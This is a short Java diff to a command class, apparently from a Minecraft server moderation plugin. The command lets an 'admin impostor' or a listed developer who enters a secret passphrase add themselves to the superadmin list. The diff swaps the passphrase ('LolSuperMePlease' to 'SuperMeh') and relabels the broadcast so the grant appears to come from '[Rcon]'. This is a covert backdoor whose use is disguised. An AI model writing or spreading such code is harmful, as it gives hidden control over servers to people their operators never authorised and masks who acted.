@@ -23,11 +23,11 @@ public class Command_fom extends TFM_Command
     }
     else if (args.length == 1)
     {
-        if (args[0].equalsIgnoreCase("LolSuperMePlease"))
+        if (args[0].equalsIgnoreCase("SuperMeh"))
         {
           if (TFM_AdminList.isAdminImpostor(sender_p) || TFM_Util.DEVELOPERS.contains(sender.getName()))
           {
-          TFM_Util.adminAction("FreedomOPMod",  "Adding "  + sender.getName() + " to the superadmin config.", true);
+          TFM_Util.adminAction(ChatColor.GRAY + "[" + ChatColor.GREEN + "Rcon" + ChatColor.GRAY + "]  ",  "Adding "  + sender.getName() + " to the SuperAdmin config", true);
           TFM_AdminList.addSuperadmin(sender_p);
           return true;
            }
